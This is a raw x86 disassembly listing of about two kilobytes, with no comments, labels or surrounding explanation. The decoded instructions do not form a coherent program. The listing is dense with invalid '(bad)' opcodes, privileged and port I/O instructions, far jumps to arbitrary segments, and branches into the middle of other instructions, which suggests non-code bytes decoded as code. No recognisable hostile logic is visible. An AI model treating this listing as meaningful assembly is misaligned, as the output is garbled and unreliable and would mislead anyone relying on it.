  4253ae:	and    eax,0x13aca75e
  4253b3:	icebp  
  4253b4:	test   BYTE PTR [ebx-0x7e277da5],bh
  4253ba:	jge    0x425430
  4253bc:	xor    al,0xa5
  4253be:	std    
  4253bf:	sub    BYTE PTR [edi+0xf],cl
  4253c2:	addr16 out dx,eax
  4253c4:	adc    esp,DWORD PTR [edx+0x2807653d]
  4253ca:	popf   
  4253cb:	rcr    bl,1
  4253cd:	jns    0x42540e
  4253cf:	xchg   ecx,eax
  4253d0:	mov    esp,0xd33abdd3
  4253d5:	xchg   edx,eax
  4253d6:	fidiv  WORD PTR [eax-0x41]
  4253d9:	(bad)  
  4253da:	pushf  
  4253db:	stos   DWORD PTR es:[edi],eax
  4253dc:	aad    0x34
  4253de:	ins    DWORD PTR es:[edi],dx
  4253df:	shr    ebp,cl
  4253e1:	mov    gs,eax
  4253e3:	fs daa 
  4253e5:	and    al,BYTE PTR [edx-0x24]
  4253e8:	stc    
  4253e9:	(bad)  [ebp+0x1b]
  4253ec:	mov    cl,0x50
  4253ee:	sahf   
  4253ef:	rol    bh,0x1a
  4253f2:	dec    esi
  4253f3:	cmp    ecx,DWORD PTR [eax]
  4253f5:	lea    ecx,[ecx-0x405d9107]
  4253fb:	enter  0x247e,0x8e
  4253ff:	lea    edx,ds:0x6a8bec45
  425405:	scas   al,BYTE PTR es:[edi]
  425406:	shl    BYTE PTR [ecx],cl
  425408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425409:	ror    BYTE PTR [ecx+eax*2],1
  42540c:	pop    ecx
  42540d:	push   edx
  42540e:	ret    
  42540f:	(bad)  
  425410:	jno    0x42545c
  425412:	add    cl,al
  425414:	iret   
  425415:	mov    ah,0x5c
  425417:	in     eax,dx
  425418:	inc    DWORD PTR [ebx]
  42541a:	inc    ebp
  42541b:	call   0x35e1:0xbd712f2a
  425422:	inc    edx
  425423:	sti    
  425424:	xchg   DWORD PTR [edi-0x7c],esp
  425427:	test   al,0xb4
  425429:	in     al,0x50
  42542b:	xor    eax,0x4dc2f399
  425430:	add    eax,0x5ad5bd54
  425435:	je     0x425428
  425437:	aam    0xc3
  425439:	(bad)  
  42543a:	sahf   
  42543b:	pop    esp
  42543c:	inc    ebp
  42543d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42543e:	add    BYTE PTR [ebp-0x73ddb006],0x18
  425445:	cmp    DWORD PTR [edi-0x53b670c1],0x71
  42544c:	and    eax,0xe9c9eb73
  425451:	or     BYTE PTR [ecx+0x7b67d77],dl
  425457:	fs ss (bad) 
  42545a:	adc    edx,DWORD PTR [edi]
  42545c:	cmp    DWORD PTR [esp+esi*1+0x5a8a1db3],ecx
  425463:	jns    0x425423
  425465:	pop    ss
  425466:	outs   dx,BYTE PTR ds:[esi]
  425467:	lahf   
  425468:	or     DWORD PTR [edx],ebp
  42546a:	mov    WORD PTR [ecx+0x4ab7c73],ss
  425470:	mov    ebx,0x7a07b09c
  425475:	pop    ecx
  425476:	jge    0x425485
  425478:	sbb    BYTE PTR [ecx],cl
  42547a:	jne    0x425457
  42547c:	xchg   ecx,eax
  42547d:	push   ecx
  42547e:	fst    QWORD PTR [eax+0x7b87801]
  425484:	mov    ecx,DWORD PTR [ebp+esi*4+0x62f04045]
  42548b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42548c:	jbe    0x425478
  42548e:	cmp    cl,BYTE PTR [eax+0x15c00d7f]
  425494:	xchg   BYTE PTR [edx+0x1d],bh
  425497:	pop    edx
  425498:	dec    ebx
  425499:	adc    ah,bl
  42549b:	cdq    
  42549c:	adc    esi,DWORD PTR [esi]
  42549e:	sbb    edi,ebp
  4254a0:	or     esi,DWORD PTR [ebx-0x305d350a]
  4254a6:	mov    eax,ds:0x5214df6a
  4254ab:	js     0x425435
  4254ad:	mov    ah,0xb4
  4254af:	push   cs
  4254b0:	push   es
  4254b1:	dec    esi
  4254b2:	sbb    DWORD PTR [ebp-0x49cbad0d],esp
  4254b8:	sub    dh,bl
  4254ba:	xor    al,0xb9
  4254bc:	add    DWORD PTR [eax-0x4f],edi
  4254bf:	jp     0x425470
  4254c1:	mov    bh,0x82
  4254c3:	ret    
  4254c4:	add    al,0x9a
  4254c6:	in     al,dx
  4254c7:	add    BYTE PTR [esi],bh
  4254c9:	fimul  DWORD PTR [edx]
  4254cb:	mov    eax,ds:0x10a932c8
  4254d0:	int    0x5d
  4254d2:	add    DWORD PTR ds:0x715adcb8,ebp
  4254d8:	and    BYTE PTR cs:[ebx+0x29],bh
  4254dc:	or     cl,BYTE PTR [esi+edx*8]
  4254df:	push   ebx
  4254e0:	sti    
  4254e1:	pop    ecx
  4254e2:	pop    ss
  4254e3:	dec    edi
  4254e4:	shl    BYTE PTR [edi-0x62e5f43d],0xbd
  4254eb:	jg     0x425558
  4254ed:	lds    ebp,FWORD PTR [ebx+0x5d]
  4254f0:	push   eax
  4254f1:	imul   BYTE PTR [ecx-0x6f]
  4254f4:	pop    ss
  4254f5:	xor    al,0xe2
  4254f7:	pop    edi
  4254f8:	sbb    cl,BYTE PTR [ebx]
  4254fa:	rcr    BYTE PTR [ebx],1
  4254fc:	and    cl,BYTE PTR [ebx+0x77]
  4254ff:	scas   eax,DWORD PTR es:[edi]
  425500:	cmp    DWORD PTR [esp+ebp*8],edx
  425503:	mov    esi,0x256e5f21
  425508:	and    dl,BYTE PTR cs:[esi+0x30]
  42550c:	inc    ebx
  42550d:	and    DWORD PTR [eax],ebp
  42550f:	pushw  ds
  425511:	es das 
  425513:	adc    al,0x1c
  425515:	ficom  WORD PTR [ebp-0x750419d1]
  42551b:	retf   0x272b
  42551e:	jne    0x42558c
  425520:	or     al,0xee
  425522:	adc    DWORD PTR [edx+ecx*2+0x614b5843],edx
  425529:	(bad)
  42552c:	mov    ch,0x81
  42552e:	jle    0x4255ad
  425530:	push   ebx
  425531:	mov    fs,WORD PTR [edx+0x59]
  425534:	mov    edi,0x1e5b940f
  425539:	lds    ebp,FWORD PTR [edi-0x689252f8]
  42553f:	call   0xa2598bd6
  425544:	push   cs
  425545:	inc    esp
  425546:	(bad)  
  425548:	xlat   BYTE PTR ds:[ebx]
  425549:	and    BYTE PTR [ebp-0x75],cl
  42554c:	into   
  42554d:	mov    ebx,0x2a598aa4
  425552:	push   edx
  425553:	cmp    bh,BYTE PTR [esi+eax*4]
  425556:	popf   
  425557:	mov    dl,0xd0
  425559:	in     eax,0x18
  42555b:	not    DWORD PTR [esi+0x95b5792]
  425561:	shr    DWORD PTR [ebp-0x23b37828],1
  425567:	add    DWORD PTR [eax+0x62],ebx
  42556a:	mov    esp,DWORD PTR [eax-0x5f3c9205]
  425570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425571:	xchg   DWORD PTR [ebp-0x516935a6],ecx
  425577:	add    eax,0x49d9888d
  42557c:	pop    es
  42557d:	clc    
  42557e:	stc    
  42557f:	push   es
  425580:	pop    eax
  425581:	popa   
  425582:	ins    BYTE PTR es:[edi],dx
  425583:	call   0x509164d4
  425588:	mov    ds:0x47427bcc,al
  42558d:	sbb    BYTE PTR [ebx-0x7bc6419a],bl
  425593:	mov    al,0x5b
  425595:	jb     0x425522
  425597:	mov    cl,0x54
  425599:	mov    ecx,0x6a20f383
  42559e:	cdq    
  42559f:	jmp    0x425525
  4255a1:	bound  esp,QWORD PTR ds:0x233422f0
  4255a7:	cmp    bh,dl
  4255a9:	test   DWORD PTR [esi+0x177e989a],eax
  4255af:	aad    0x7e
  4255b1:	xchg   BYTE PTR [edx-0x60],bl
  4255b4:	pop    ebx
  4255b5:	cmp    eax,0xb55869e5
  4255ba:	imul   edi,DWORD PTR ds:0x498d3804,0xaa3b81f8
  4255c4:	sbb    al,0x87
  4255c6:	mov    edx,0x72e28c48
  4255cb:	ficomp DWORD PTR [ebx+0x2b50e061]
  4255d1:	icebp  
  4255d2:	ins    BYTE PTR es:[edi],dx
  4255d3:	shl    DWORD PTR [ebx],1
  4255d5:	ror    DWORD PTR [edx+0x5b27c569],cl
  4255db:	jmp    0x42565a
  4255dd:	int3   
  4255de:	push   esp
  4255df:	in     al,0x77
  4255e1:	jbe    0x425657
  4255e3:	xor    dl,BYTE PTR [ecx+0x40]
  4255e6:	aaa    
  4255e7:	scas   eax,DWORD PTR es:[edi]
  4255e8:	out    dx,al
  4255e9:	pop    esi
  4255ea:	cld    
  4255eb:	pop    ss
  4255ec:	pushf  
  4255ed:	inc    eax
  4255ee:	sbb    BYTE PTR [ecx],0x1e
  4255f1:	jns    0x4255d0
  4255f3:	mov    bh,0xe0
  4255f5:	std    
  4255f6:	clc    
  4255f7:	mov    edx,0xf0562cd0
  4255fc:	repz scas eax,DWORD PTR es:[edi]
  4255fe:	mov    ecx,0x71b051ef
  425603:	jge    0x425610
  425605:	cld    
  425606:	bound  edi,QWORD PTR [ebx]
  425608:	shl    DWORD PTR [edx],0x99
  42560b:	dec    eax
  42560c:	js     0x4255d1
  42560e:	daa    
  42560f:	add    ebx,DWORD PTR [ecx+0x27e9627d]
  425615:	mov    ch,0x14
  425617:	ja     0x425644
  425619:	ja     0x425600
  42561b:	cs sub al,0x13
  42561e:	frstor [ebp+0x17]
  425621:	xor    al,0xe1
  425623:	inc    esi
  425624:	inc    edi
  425625:	push   esi
  425626:	fwait
  425627:	or     DWORD PTR [ecx+0x55],esp
  42562a:	and    al,0x85
  42562c:	mov    WORD PTR [eax+0x45],gs
  42562f:	ss mov dh,al
  425632:	and    eax,0xd95ee48b
  425637:	mov    ah,0xab
  425639:	lahf   
  42563a:	adc    eax,esp
  42563c:	mov    ebx,0xcb1d2b9c
  425641:	gs ss push ebx
  425644:	fs and al,0x3f
  425647:	push   ecx
  425648:	leave  
  425649:	cld    
  42564a:	mov    eax,ds:0x5b1fb49
  42564f:	pop    eax
  425650:	mov    cl,0x5b
  425652:	clc    
  425653:	xchg   esi,eax
  425654:	push   es
  425655:	test   eax,0x630faccd
  42565a:	arpl   WORD PTR [edi+0x618f7a1b],dx
  425660:	mov    ebx,DWORD PTR [eax-0x603cbece]
  425666:	(bad)  
  425667:	gs mov ebx,0x5f648319
  42566d:	add    al,0x41
  42566f:	jmp    0x4bf5:0x37dbeac7
  425676:	push   ebp
  425677:	adc    DWORD PTR [eax+0x5e],0xffffff8a
  42567b:	xor    al,0xef
  42567d:	jbe    0x4256ba
  42567f:	jecxz  0x425659
  425681:	add    BYTE PTR [esi+0x792d3a61],dl
  425687:	shr    al,0x4e
  42568a:	fucomi st,st(5)
  42568c:	repnz inc ecx
  42568e:	sbb    eax,0x6162e386
  425693:	inc    ecx
  425694:	push   0xbc634655
  425699:	es jg  0x425687
  42569c:	sar    DWORD PTR [edx+0x409188ea],0x62
  4256a3:	aad    0x33
  4256a5:	fld    DWORD PTR [esi]
  4256a7:	stc    
  4256a8:	pop    edi
  4256a9:	adc    ebx,esp
  4256ab:	call   0xc03d:0x5497306e
  4256b2:	xchg   edi,eax
  4256b3:	and    eax,0x165d3625
  4256b8:	imul   esi,DWORD PTR [eax-0x4],0xffffffb4
  4256bc:	and    DWORD PTR [eax+0x3eec7e4d],ebx
  4256c2:	mov    ds:0xa410e713,al
  4256c7:	daa    
  4256c8:	jmp    0xa828:0x7799c222
  4256cf:	aam    0xeb
  4256d1:	add    al,0x84
  4256d3:	sbb    eax,0xdc059464
  4256d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256d9:	ficomp DWORD PTR [eax+0x3c]
  4256dc:	jg     0x425680
  4256de:	das    
  4256df:	retf   0x697c
  4256e2:	adc    DWORD PTR [ebx+0x62],edx
  4256e5:	scas   al,BYTE PTR es:[edi]
  4256e6:	icebp  
  4256e7:	stos   BYTE PTR es:[edi],al
  4256e8:	les    esi,FWORD PTR gs:[ebp+eiz*8-0xe]
  4256ed:	lods   al,BYTE PTR ds:[esi]
  4256ee:	fimul  WORD PTR [ecx]
  4256f0:	mov    es:0xf3813a6e,al
  4256f6:	retf   0x91b0
  4256f9:	xchg   ebx,eax
  4256fa:	hlt    
  4256fb:	sub    ch,bh
  4256fd:	imul   esp,DWORD PTR ds:0x5b01ffbf,0xffffff97
  425704:	sbb    bl,BYTE PTR [esi]
  425706:	mov    ebp,0x669e9c01
  42570b:	jmp    DWORD PTR [eax+0x70bd1d13]
  425711:	(bad)  
  425712:	mov    ds:0xf118207e,al
  425717:	mov    dh,0x30
  425719:	aam    0xc5
  42571b:	in     al,dx
  42571c:	mov    al,ds:0x48f14af0
  425721:	shl    DWORD PTR [edx],cl
  425723:	mov    al,ds:0xbf3bbf9d
  425728:	and    DWORD PTR ds:0xb2ad8dcc,ebp
  42572e:	dec    ebp
  42572f:	cmp    DWORD PTR [esi+0x72],0x6602152b
  425736:	stos   BYTE PTR es:[edi],al
  425737:	jae    0x4257af
  425739:	xor    eax,0xd800dd10
  42573e:	adc    BYTE PTR [eax+0xbbd164d],ah
  425744:	dec    eax
  425745:	call   0x2021:0xda893395
  42574c:	add    ch,cl
  42574e:	sub    BYTE PTR [esi+0x2c72c4fa],ah
  425754:	add    eax,0xfd467bf0
  425759:	mov    BYTE PTR [edi-0x53],cl
  42575c:	lods   eax,DWORD PTR ds:[esi]
  42575d:	int    0xfc
  42575f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425760:	lds    eax,FWORD PTR [ecx+0x7ec36eb7]
  425766:	repz pop ecx
  425768:	cs aaa 
  42576a:	push   0x2d0cda04
  42576f:	lds    esi,FWORD PTR [esi]
  425771:	cmp    ecx,edx
  425773:	add    bl,BYTE PTR [edx+edx*8-0xcc44f1d]
  42577a:	cmp    DWORD PTR [eax-0x66],eax
  42577d:	mov    WORD PTR [esi+0x41bad197],ss
  425783:	add    eax,0xc23ad361
  425788:	fldcw  WORD PTR [eax]
  42578a:	cld    
  42578b:	xchg   esp,eax
  42578c:	sub    BYTE PTR [edi-0x4],bl
  42578f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425790:	pop    eax
  425791:	pop    ebp
  425792:	xor    al,0xa3
  425794:	push   esp
  425795:	pop    ss
  425796:	sbb    eax,0xba25da3d
  42579b:	or     esi,DWORD PTR [ecx+0x42]
  42579e:	lds    edx,FWORD PTR fs:0xa2ab0260
  4257a5:	pop    ds
  4257a6:	arpl   WORD PTR [ebx+0x434ac14d],si
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	xchg   DWORD PTR [ebx],ecx
  4257ba:	shl    ch,1
  4257bc:	add    DWORD PTR [eax],eax
  4257be:	mov    BYTE PTR [esi],al
  4257c0:	add    BYTE PTR [eax],al
  4257c2:	inc    ecx
  4257c3:	repnz sub BYTE PTR [ebx+esi*4-0x6d404868],dl
  4257cb:	jg     0x42579a
  4257cd:	lahf   
  4257ce:	ja     0x425808
  4257d0:	fmul   st(6),st
  4257d2:	fsubp  st(0),st
  4257d4:	hlt    
  4257d5:	push   es
  4257d6:	mov    DWORD PTR [esi*2-0x75ea7239],edi
  4257dd:	lahf   
  4257de:	mov    ds:0xed4271ab,al
  4257e3:	sub    BYTE PTR [edi],0x15
  4257e6:	jae    0x425784
  4257e8:	jo     0x4257a2
  4257ea:	dec    ecx
  4257eb:	ds into 
  4257ed:	lods   eax,DWORD PTR ds:[esi]
  4257ee:	adc    al,0x58
  4257f0:	add    ch,BYTE PTR [eax]
  4257f2:	mov    ecx,0xc5ece11
  4257f7:	add    al,0xe0
  4257f9:	dec    esi
  4257fa:	pop    ecx
  4257fb:	sub    DWORD PTR [esi+0x36dfb9f5],0xba40dfca
  425805:	inc    eax
  425806:	jmp    0x408d:0x66051c26
  42580d:	ror    al,1
  42580f:	xor    ch,ch
  425811:	pop    edi
  425812:	cwde   
  425813:	lods   al,BYTE PTR ds:[esi]
  425814:	mov    ecx,0xf8850d0c
  425819:	js     0x42585e
  42581b:	push   eax
  42581c:	dec    esp
  42581d:	mov    ds,WORD PTR [ebp-0x30031130]
  425823:	fiadd  DWORD PTR [edx-0x6f]
  425826:	xor    BYTE PTR [eax-0x7632d683],cl
  42582c:	(bad)  
  42582e:	out    0x99,eax
  425830:	jmp    0x42587c
  425832:	cmp    BYTE PTR [ebx],al
  425834:	lock mov esp,0x263e0d12
  42583a:	adc    al,0xb5
  42583c:	xchg   edi,eax
  42583d:	inc    esi
  42583e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42583f:	cmovle edi,DWORD PTR [eax]
  425842:	fiadd  DWORD PTR [edi]
  425844:	dec    ecx
  425845:	retf   0xc8aa
  425848:	push   0xec3ff03e
  42584d:	mov    ebx,0x7ceadbfc
  425852:	in     al,dx
  425853:	inc    eax
  425854:	ds pop ebp
  425856:	mov    ds:0x3865667c,eax
  42585b:	xor    al,0x58
  42585d:	jmp    0x60961508
  425862:	hlt    
  425863:	dec    edx
  425864:	jo     0x425841
  425866:	and    dl,BYTE PTR [ebx+0x2f]
  425869:	loopne 0x425879
  42586b:	xor    al,0xf1
  42586d:	sub    BYTE PTR [ebx+0x65],bh
  425870:	cdq    
  425871:	(bad)  
  425872:	jmp    0xead84b58
  425877:	mov    bl,0x2c
  425879:	mov    ds:0xef8c3461,al
  42587e:	adc    DWORD PTR es:[ecx],ecx
  425881:	fadd   QWORD PTR [edi+0x3d]
  425884:	mov    cs,WORD PTR [edx-0x55]
  425887:	neg    DWORD PTR [ebp-0x58]
  42588a:	xor    ebx,esi
  42588c:	and    BYTE PTR [edx],dl
  42588e:	fcomp  QWORD PTR [edi+0x15]
  425891:	inc    ebx
  425892:	stos   DWORD PTR es:[edi],eax
  425893:	cmp    DWORD PTR [esi],esp
  425895:	fmul   DWORD PTR [edx+0xb]
  425898:	cmp    ebp,esp
  42589a:	xchg   DWORD PTR [eax],ecx
  42589c:	lahf   
  42589d:	in     al,0x4d
  42589f:	adc    bl,BYTE PTR [ebx+0x58c0e89e]
  4258a5:	pop    ss
  4258a6:	lock and bl,dh
  4258a9:	aas    
  4258aa:	jb     0x425922
  4258ac:	or     al,0x88
  4258ae:	inc    esi
  4258af:	ret    0xf3c
  4258b2:	aad    0x1a
  4258b4:	pop    eax
  4258b5:	mov    ah,0xf6
  4258b7:	adc    al,0x8d
  4258b9:	cmp    al,0xce
  4258bb:	xlat   BYTE PTR ds:[ebx]
  4258bc:	xchg   DWORD PTR [edx+0x3a],ebx
  4258bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258c0:	lods   eax,DWORD PTR ds:[esi]
  4258c1:	mov    bl,0x4e
  4258c3:	or     DWORD PTR [ecx-0x3e434c0d],ebx
  4258c9:	shr    dl,cl
  4258cb:	icebp  
  4258cc:	das    
  4258cd:	pop    es
  4258ce:	jg     0x425915
  4258d0:	shr    ebx,cl
  4258d2:	ins    DWORD PTR es:[edi],dx
  4258d3:	pop    ss
  4258d4:	lds    esi,FWORD PTR [edx]
  4258d6:	popf   
  4258d7:	adc    DWORD PTR [ebp+ebx*2-0x6c3bab5a],ebx
  4258de:	or     al,0x8b
  4258e0:	iret   
  4258e1:	add    al,dl
  4258e3:	sbb    al,0x42
  4258e5:	fisubr DWORD PTR [ebx-0x3e928d57]
  4258eb:	push   es
  4258ec:	lods   eax,DWORD PTR ds:[esi]
  4258ed:	leave  
  4258ee:	push   esi
  4258ef:	xchg   ecx,eax
  4258f0:	das    
  4258f1:	and    al,0xde
  4258f3:	lahf   
  4258f4:	cmp    DWORD PTR [eax],0xffffffc8
  4258f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258f8:	sub    eax,0x3b56fdef
  4258fd:	std    
  4258fe:	aad    0x0
  425900:	mov    ah,0xc2
  425902:	aaa    
  425903:	cli    
  425904:	mov    ds:0x5d3284f6,eax
  425909:	mov    esi,0x76855ae7
  42590e:	or     ebx,DWORD PTR [ebp-0x9ae1f4f]
  425914:	push   ecx
  425915:	add    esp,DWORD PTR [ebx-0x14]
  425918:	or     DWORD PTR [ebp-0x78],ebx
  42591b:	test   DWORD PTR [ebx+0x69a4d0f5],ebp
  425921:	daa    
  425922:	int    0xdf
  425924:	into   
  425925:	jbe    0x4258f8
  425927:	jmp    0x3d4e:0xab8f11b6
  42592e:	push   ecx
  42592f:	mov    ecx,0x8c637b9b
  425934:	push   0x57
  425936:	stos   BYTE PTR es:[edi],al
  425937:	pusha  
  425938:	pop    es
  425939:	fsub   QWORD PTR [ebp+0x47]
  42593c:	adc    DWORD PTR [edx-0x68c311bc],esp
  425942:	retf   0xfc9d
  425945:	sbb    cl,BYTE PTR [eax]
  425947:	xchg   ebx,eax
  425948:	pop    edi
  425949:	ret    
  42594a:	xchg   ch,ch
  42594c:	ds adc edi,ebx
  42594f:	cmovl  ecx,DWORD PTR [ebx]
  425952:	call   0x5a7b:0xae8e8b36
  425959:	jle    0x4259a9
  42595b:	push   ebp
  42595c:	outs   dx,BYTE PTR ds:[esi]
  42595d:	sbb    esi,eax
  42595f:	nop
  425960:	into   
  425961:	ds xchg esp,eax
  425963:	mov    ch,0x78
  425965:	arpl   WORD PTR [edx-0x4f],bx
  425968:	mov    DWORD PTR [eax+0x3f],esi
  42596b:	fsub   st(1),st
  42596d:	sub    DWORD PTR [eax-0x3b75f713],esp
  425973:	sbb    al,0x87
  425975:	jge    0x42596c
  425977:	ror    BYTE PTR [ebp+0x25],0xfb
  42597b:	dec    ebx
  42597c:	jmp    0x8d7a:0x742934c2
  425983:	pop    esi
  425984:	adc    ebp,DWORD PTR [esp+ebp*8]
  425987:	cdq    
  425988:	iret   
  425989:	sub    cl,BYTE PTR [edx+eiz*1]
  42598c:	and    al,BYTE PTR [esi+0x14]
  42598f:	and    al,0xfd
  425991:	arpl   si,dx
  425993:	mov    bh,0xf0
  425995:	sahf   
  425996:	pop    esp
  425997:	dec    edx
  425998:	pop    ss
  425999:	sbb    al,0xa
  42599b:	xchg   edi,edi
  42599d:	dec    edx
  42599e:	out    0x82,eax
  4259a0:	outs   dx,BYTE PTR ds:[esi]
  4259a1:	pop    sp
  4259a3:	call   0x948196fa
  4259a8:	imul   eax,DWORD PTR [ebx+0x401c7ae1],0x5e696e0c
  4259b2:	hlt    
  4259b3:	not    cl
  4259b5:	retf   0x6d03
  4259b8:	and    eax,0x8951e20a
  4259bd:	mov    bl,0xdc
  4259bf:	dec    esi
  4259c0:	push   0xd
  4259c2:	jnp    0x4259f4
  4259c4:	gs cdq 
  4259c6:	lds    eax,FWORD PTR [esi+0x58cb67d9]
  4259cc:	or     al,0xe3
  4259ce:	mov    edi,0xbd7b25da
  4259d3:	mov    esi,0xcc4b4dc8
  4259d8:	cmp    BYTE PTR [esi],ch
  4259da:	add    ebp,edx
  4259dc:	dec    esi
  4259dd:	inc    esp
  4259de:	aas    
  4259df:	gs dec esp
  4259e1:	jg     0x425985
  4259e3:	cmp    ecx,DWORD PTR [ecx-0x31827bbb]
  4259e9:	cmp    eax,0x2dc57a30
  4259ee:	fidiv  WORD PTR [ebx-0xea3eacf]
  4259f4:	jmp    0xf15c:0x4f0299f0
  4259fb:	iret   
  4259fc:	in     eax,dx
  4259fd:	popa   
  4259fe:	rcr    DWORD PTR [esi+esi*2+0x6a],0xf8
  425a03:	int    0x5e
  425a05:	test   eax,0xe53cb781
  425a0a:	popa   
  425a0b:	fdiv   QWORD PTR [ebp+0xdea3c09]
  425a11:	sub    esp,DWORD PTR [ebp+0x3e]
  425a14:	lea    ebx,[ebx+0x48]
  425a17:	fdiv   st(2),st
  425a19:	mov    ds:0x9cc4f362,al
  425a1e:	inc    edx
  425a1f:	fstp   DWORD PTR [esi+0x55]
  425a22:	sub    eax,0xe40cc5e0
  425a27:	dec    ecx
  425a28:	jne    0x425aa2
  425a2a:	jmp    0x4cff:0x72bd04f6
  425a31:	add    edx,DWORD PTR [edx-0x2]
  425a34:	test   DWORD PTR [esi-0x1e],0xcd5a4e16
  425a3b:	cmp    ch,ah
  425a3d:	stc    
  425a3e:	cli    
  425a3f:	fldenv [esi]
  425a41:	add    al,0x81
  425a43:	mov    esi,ds
  425a45:	retf   
  425a46:	adc    dh,bl
  425a48:	pop    edx
  425a49:	in     al,0x65
  425a4b:	mov    bh,0xb1
  425a4d:	dec    esp
  425a4e:	mov    eax,0x414b1f2
  425a53:	push   esi
  425a54:	push   0x9dfa3354
  425a59:	es in  eax,dx
  425a5b:	push   ecx
  425a5c:	inc    ebp
  425a5d:	aaa    
  425a5e:	movaps xmm6,xmm7
  425a61:	jmp    DWORD PTR [edi+0x3e]
  425a64:	xchg   DWORD PTR [ebp+esi*4-0x243d1de7],ebx
  425a6b:	adc    BYTE PTR [esi],cl
  425a6d:	fs pop ecx
  425a6f:	dec    ebp
  425a70:	icebp  
  425a71:	push   0xbcbb73df
  425a76:	jl     0x425ad8
  425a78:	pop    ecx
  425a79:	sbb    BYTE PTR [ecx-0x4b],0xee
  425a7d:	mov    al,ds:0x380dfc09
  425a82:	xchg   esp,eax
  425a83:	and    DWORD PTR [ecx-0x5bba5cd2],0xd2aeb110
  425a8d:	and    DWORD PTR [ecx+0x7107d55b],esp
  425a93:	shl    BYTE PTR [esi-0x68],0xff
  425a97:	add    BYTE PTR [esi],dl
  425a99:	jl     0x425ace
  425a9b:	call   DWORD PTR [ecx]
  425a9d:	cmp    al,0xef
  425a9f:	jg     0x425a58
  425aa1:	sti    
  425aa2:	jo     0x425ac9
  425aa4:	xor    DWORD PTR [esi-0x17],ebx
  425aa7:	mov    al,0x5c
  425aa9:	dec    eax
  425aaa:	jns    0x425add
  425aac:	loope  0x425a61
  425aae:	scas   eax,DWORD PTR es:[edi]
  425aaf:	out    dx,eax
  425ab0:	push   ebx
  425ab1:	mov    DWORD PTR [esi+0x1251a723],esp
  425ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ab8:	lods   al,BYTE PTR ds:[esi]
  425ab9:	call   0x668012f
  425abe:	jns    0x425a76
  425ac0:	sbb    DWORD PTR [ebp+0xa],ebx
  425ac3:	cmc    
  425ac4:	mov    BYTE PTR [eax+0x67889538],0x1f
  425acb:	pop    ds
  425acc:	xor    ebx,DWORD PTR [ebp-0x1b4c454b]
  425ad2:	in     al,0x60
  425ad4:	pop    ebx
  425ad5:	gs mov ah,0xbc
  425ad8:	fisub  DWORD PTR ds:0x12ceba8
  425ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425adf:	push   ebp
  425ae0:	ja     0x425ad3
  425ae2:	imul   ebx,DWORD PTR [ecx],0xfffffffc
  425ae5:	jecxz  0x425ae3
  425ae7:	out    dx,al
  425ae8:	std    
  425ae9:	pop    es
  425aea:	sbb    edx,esi
  425aec:	mov    ds:0x6f3630ec,al
  425af1:	xchg   esp,eax
  425af2:	sub    ch,cl
  425af4:	popf   
  425af5:	lods   al,BYTE PTR ds:[esi]
  425af6:	cdq    
  425af7:	sbb    BYTE PTR [edi-0x23],dh
  425afa:	loop   0x425b11
  425afc:	xchg   esi,eax
  425afd:	inc    ecx
  425afe:	cmp    al,0x51
  425b00:	and    al,BYTE PTR [esi-0x6305efb2]
  425b06:	fst    st(2)
  425b08:	jb     0x425b2b
  425b0a:	dec    ebx
  425b0b:	push   eax
  425b0c:	sahf   
  425b0d:	imul   edi,esi,0xffffffd1
  425b10:	fwait
  425b11:	inc    esi
  425b12:	mov    esp,0x6f046912
  425b17:	mov    WORD PTR [ebx+edx*2+0x2e1cf4b],gs
  425b1e:	pushf  
  425b1f:	pushf  
  425b20:	das    
  425b21:	or     BYTE PTR ds:[eax-0x6f9db301],ah
  425b28:	rcr    DWORD PTR [ebx],cl
  425b2a:	ss inc ebx
  425b2c:	push   edx
  425b2d:	(bad)  
  425b2e:	push   esp
  425b2f:	and    DWORD PTR [ecx+edx*8+0x50],ecx
  425b33:	fidiv  DWORD PTR [esi-0x4225f2e]
  425b39:	inc    ebx
  425b3a:	mov    eax,ds:0x497e2e28
  425b3f:	xor    al,0x9b
  425b41:	xchg   esi,eax
  425b42:	dec    ecx
  425b43:	in     eax,dx
  425b44:	aam    0x20
  425b46:	daa    
  425b47:	aad    0x40
  425b49:	dec    ebx
  425b4a:	jle    0x425b05
  425b4c:	jnp    0x425b7c
  425b4e:	std    
  425b4f:	ss cmp eax,0xe16ac59f
  425b55:	hlt    
  425b56:	push   es
  425b57:	xchg   DWORD PTR [ebx+0x3eb84a69],edi
  425b5d:	inc    esi
  425b5e:	vpsubusw ymm1,ymm3,ymm5
  425b62:	push   esi
  425b63:	add    al,BYTE PTR [eax]
  425b65:	loope  0x425bae
  425b67:	sub    cl,BYTE PTR [ebx+0x15]
  425b6a:	mov    edx,0x673bb07e
  425b6f:	push   esp
  425b70:	or     DWORD PTR [edi+0x57d36e0a],0xffffffcd
  425b77:	cmp    dh,BYTE PTR [edi+0x14c986b4]
  425b7d:	xchg   dh,ah
  425b7f:	and    dh,BYTE PTR [ebp+0x609b3bc4]
  425b85:	mov    dh,0x56
  425b87:	mov    dh,0x13
  425b89:	sbb    DWORD PTR [ebp+0x4743db03],esp
  425b8f:	lods   al,BYTE PTR ds:[esi]
  425b90:	add    al,0xfe
  425b92:	aaa    
  425b93:	mov    dl,0xfe
  425b95:	daa    
  425b96:	into   
  425b97:	mov    eax,ds:0x1fbb256a
  425b9c:	mov    cl,0xd4
  425b9e:	fwait
  425b9f:	inc    edi
  425ba0:	ret    0xfbe2
  425ba3:	rcr    DWORD PTR [edx],1
  425ba5:	(bad)  
  425ba6:	(bad)
  425bab:	call   0xdcf080e8
  425bb0:	ror    BYTE PTR [edx],0x18
  425bb3:	mov    edx,DWORD PTR [ebx]
  425bb5:	fcmovbe st,st(0)
